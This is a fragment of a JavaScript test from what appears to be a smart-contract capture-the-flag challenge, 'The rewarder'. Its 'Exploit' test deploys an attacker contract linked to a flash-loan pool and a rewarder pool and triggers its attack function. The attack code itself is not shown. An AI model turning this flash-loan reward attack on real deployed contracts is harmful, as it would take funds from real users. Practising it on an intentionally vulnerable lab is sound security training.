...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackerContract = await ethers.getContractFactory('AttackRewarder', attacker);
        // address _flashPool,address _pool,address _rewardToken,address _dvtToken
        this.attack = await AttackerContract.deploy(this.flashLoanPool.address,this.rewarderPool.address,this.rewardToken.address,this.liquidityToken.address);

        const attackTokenPool = this.attack.connect(attacker);
        await attackTokenPool.attack();
    });
